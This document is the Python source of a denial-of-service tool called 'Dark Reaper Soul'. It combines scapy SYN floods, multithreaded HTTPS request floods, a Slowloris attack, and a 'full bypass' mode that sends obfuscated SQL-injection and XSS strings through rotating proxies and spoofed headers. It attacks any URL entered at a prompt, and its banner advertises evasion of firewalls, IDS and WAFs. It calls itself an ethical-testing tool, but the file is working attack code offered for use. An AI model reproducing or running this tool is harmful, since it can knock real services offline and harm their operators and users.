import warnings
# Suppress cryptography warnings before scapy import
warnings.filterwarnings("ignore", category=DeprecationWarning, module="cryptography.*")
warnings.filterwarnings("ignore", message=".*TripleDES.*")  # Catch TripleDES specifically

import requests
import threading
import random
import time
import sys
import pyfiglet
from colorama import Fore, Style
from urllib.parse import urlparse
import socket
import ssl
import base64
from concurrent.futures import ThreadPoolExecutor
import urllib3
import requests.exceptions
from scapy.all import IP, TCP, send

# Suppress InsecureRequestWarning from urllib3
warnings.filterwarnings("ignore", category=urllib3.exceptions.InsecureRequestWarning)

# Colors for output
green = "\033[92m"
red = "\033[91m"
cyan = "\033[96m"
reset = "\033[0m"
yellow = "\033[93m"

# Generate ASCII Banner
banner = pyfiglet.figlet_format("Dark Reaper Soul", font="slant")
info = f"""
{Fore.RED}=============================================
{Fore.CYAN}      🔥 Dark Reaper Soul - DoS Attack Tool 🔥   
{Fore.RED}============================================={Fore.GREEN}
    ⚡ Created by: {Fore.YELLOW}Ajay Devaliya (@Mrsoulhunter)
    🌐 GitHub:   {Fore.YELLOW}https://github.com/Mrsoulhunter
    🔥 Expertise: Red Teaming | OSINT | Digital Forensics
    🛡️  Bypasses Firewalls, IDS, IPS & WAF Protection
    🚀 Designed for Ethical Testing & Cybersecurity Research
{Fore.RED}============================================={Style.RESET_ALL}
"""

def show_banner():
    print(Fore.GREEN + banner + Style.RESET_ALL)
    print(info)

# User-Agent list for evasion
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
]

# Proxy list (unchanged)
proxies = [
    {"http": "http://192.168.1.1:8080"},
    {"http": "socks5://192.168.1.2:1080"},
]

# Load additional proxies from file if available
try:
    with open("proxies.txt", "r") as f:
        proxies.extend([{"http": line.strip()} for line in f if line.strip()])
except FileNotFoundError:
    pass

def xor_payload(payload, key="secret"):
    """Obfuscate payload using XOR encoding."""
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(payload))

def obfuscate_payload(payload):
    """Obfuscate payload with base64 encoding."""
    return base64.b64encode(payload.encode()).decode()

def random_headers(obfuscate=True):
    """Generate random headers, optionally obfuscated."""
    headers = {
        "User-Agent": random.choice(user_agents),
        "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Referer": random.choice(["https://google.com", "https://bing.com", "https://yahoo.com"]),
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
    }
    if obfuscate:
        headers["X-Obfuscated"] = obfuscate_payload("DarkReaperSoul")
    return headers

# Raw SYN Flood with Scapy
def raw_syn_flood(target_ip, target_port, flood_count):
    """Perform a raw SYN flood using scapy."""
    try:
        for _ in range(flood_count):
            ip = IP(dst=target_ip)
            tcp = TCP(dport=target_port, flags="S", seq=random.randint(1000, 9000), window=8192)
            packet = ip / tcp
            send(packet, verbose=0)
        print(f"{cyan}[+] Raw SYN flood sent {flood_count} packets{reset}")
    except Exception as e:
        print(f"{red}[-] Raw SYN flood failed: {e}{reset}")

# HTTPS Request with Sockets
def make_https_request(target, use_proxy=False):
    """Make a single HTTPS request using sockets and return the status code."""
    target_ip = socket.gethostbyname(urlparse(target).hostname)
    target_port = 443 if urlparse(target).port is None else urlparse(target).port

    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
    context.set_ciphers("ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    wrapped_sock = context.wrap_socket(sock, server_hostname=urlparse(target).hostname)

    try:
        wrapped_sock.connect((target_ip, target_port))
        request = f"GET / HTTP/1.1\r\nHost: {urlparse(target).hostname}\r\n"
        request += "\r\n".join(f"{k}: {v}" for k, v in random_headers().items())
        request += "\r\n\r\n"
        wrapped_sock.send(request.encode())

        response = wrapped_sock.recv(4096).decode()
        status = response.split()[1] if "HTTP/1.1" in response else "Unknown"
        return status
    except Exception:
        return None
    finally:
        wrapped_sock.close()

# Basic DoS Attack
def basic_dos(target, rps, use_proxy=False):
    num_threads = min(rps, 20000)
    print(f"{green}[+] Starting Basic DoS Attack on {target} with {rps} requests/sec and {num_threads} threads{reset}")
    target_ip = socket.gethostbyname(urlparse(target).hostname)
    target_port = 443 if urlparse(target).port is None else urlparse(target).port

    threading.Thread(target=raw_syn_flood, args=(target_ip, target_port, min(num_threads // 10, 2000)), daemon=True).start()

    def attack():
        while True:
            status = make_https_request(target, use_proxy)
            if status:
                print(f"{cyan}[+] Status: {status}{reset}")
            else:
                print(f"{red}[-] Request Failed{reset}")
            time.sleep(random.uniform(0.001, 0.1) / rps)

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        for _ in range(num_threads):
            executor.submit(attack)

# Firewall Bypass DoS Attack
def firewall_bypass_dos(target, rps, use_proxy=False):
    num_threads = min(rps, 20000)
    print(f"{green}[+] Bypassing Firewall & Attacking {target} with {rps} requests/sec and {num_threads} threads{reset}")
    target_ip = socket.gethostbyname(urlparse(target).hostname)
    target_port = 443 if urlparse(target).port is None else urlparse(target).port

    threading.Thread(target=raw_syn_flood, args=(target_ip, target_port, min(num_threads // 10, 2000)), daemon=True).start()

    def attack():
        while True:
            status = make_https_request(target, use_proxy)
            if status:
                print(f"{cyan}[+] Status: {status}{reset}")
            else:
                print(f"{red}[-] Request Failed{reset}")
            time.sleep(random.uniform(0.001, 0.1) / rps)

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        for _ in range(num_threads):
            executor.submit(attack)

# Full Security Bypass DoS Attack
def full_bypass_dos(target, rps, use_proxy=False):
    num_threads = min(rps, 20000)
    print(f"{green}[+] Engaging Full Bypass Attack on {target} with {rps} requests/sec and {num_threads} threads{reset}")
    target_ip = socket.gethostbyname(urlparse(target).hostname)
    target_port = 443 if urlparse(target).port is None else urlparse(target).port

    threading.Thread(target=raw_syn_flood, args=(target_ip, target_port, min(num_threads // 10, 2000)), daemon=True).start()

    def attack():
        while True:
            headers = random_headers(obfuscate=True)
            headers["Referer"] = target
            headers["DNT"] = "1"
            payload = {"data": xor_payload(random.choice(["SELECT * FROM users", "OR 1=1", "<script>alert(1)</script>"]))}
            session = requests.Session()
            if use_proxy and proxies:
                proxy = random.choice(proxies)
                session.proxies = proxy
            for attempt in range(3):
                try:
                    response = session.post(target, headers=headers, data=payload, verify=False, timeout=30)
                    print(f"{cyan}[+] Status: {response.status_code}{reset}")
                    break
                except requests.exceptions.Timeout:
                    print(f"{yellow}[!] Timeout on attempt {attempt + 1}, retrying...{reset}")
                except requests.RequestException as e:
                    print(f"{red}[-] Request Failed: {e}{reset}")
                    break
            else:
                print(f"{red}[-] Request Failed after 3 retries: Timeout{reset}")
            time.sleep(random.uniform(0.001, 0.1) / rps)

    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        for _ in range(num_threads):
            executor.submit(attack)

# Slowloris DoS Attack
def slowloris_dos(target, rps, use_proxy=False):
    num_connections = min(rps, 20000)
    print(f"{green}[+] Starting Slowloris Attack on {target} with {num_connections} connections{reset}")
    target_ip = socket.gethostbyname(urlparse(target).hostname)
    target_port = 443

    threading.Thread(target=raw_syn_flood, args=(target_ip, target_port, min(num_connections // 10, 2000)), daemon=True).start()

    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
    context.set_ciphers("ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384")
    sockets = []

    def create_connection():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4)
        wrapped_sock = context.wrap_socket(sock, server_hostname=urlparse(target).hostname)
        wrapped_sock.connect((target_ip, target_port))
        wrapped_sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
        wrapped_sock.send(f"Host: {urlparse(target).hostname}\r\n".encode())
        wrapped_sock.send(f"User-Agent: {random.choice(user_agents)}\r\n".encode())
        wrapped_sock.send(f"X-Obfuscated: {obfuscate_payload('Slowloris')}\r\n".encode())
        return wrapped_sock

    for _ in range(num_connections):
        try:
            sock = create_connection()
            sockets.append(sock)
            print(f"{cyan}[+] Connection opened{reset}")
        except Exception:
            print(f"{red}[-] Connection failed{reset}")
            time.sleep(0.1)

    while True:
        for sock in sockets[:]:
            try:
                sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                print(f"{cyan}[+] Keeping connection alive{reset}")
            except Exception:
                sockets.remove(sock)
                print(f"{red}[-] Connection lost, reopening{reset}")
                try:
                    sockets.append(create_connection())
                except:
                    pass
        time.sleep(random.uniform(5, 15))

def main():
    show_banner()
    print(f"{yellow}[!] Note: For raw SYN floods, run with admin/root privileges (e.g., 'sudo python' on Linux).{reset}")
    print(f"{yellow}[!] Increase system limits (e.g., 'ulimit -n 65535' on Linux) for high thread counts.{reset}")
    target = input(f"{green}[?] Enter target URL: {reset}")
    try:
        rps = int(input(f"{green}[?] Enter requests per second (also used as threads/connections): {reset}"))
        if rps <= 0:
            raise ValueError("RPS must be positive.")
    except ValueError as e:
        print(f"{red}[-] Invalid RPS: {e}{reset}")
        sys.exit(1)

    use_proxy = input(f"{green}[?] Use Proxies? (y/n): {reset}").lower() == "y"
    if use_proxy:
        print(f"{yellow}[!] Note: Proxies are partially supported for Slowloris.{reset}")

    print("\nSelect Attack Mode:")
    print("1 - Basic DoS Attack")
    print("2 - Firewall Bypass DoS Attack")
    print("3 - Full Security Bypass DoS Attack")
    print("4 - Slowloris DoS Attack")
    choice = input(f"{green}[?] Select Option (1/2/3/4): {reset}")

    if choice == "1":
        basic_dos(target, rps, use_proxy)
    elif choice == "2":
        firewall_bypass_dos(target, rps, use_proxy)
    elif choice == "3":
        full_bypass_dos(target, rps, use_proxy)
    elif choice == "4":
        slowloris_dos(target, rps, use_proxy)
    else:
        print(f"{red}[-] Invalid Choice! Exiting...{reset}")
        sys.exit()

if __name__ == "__main__":
    main()
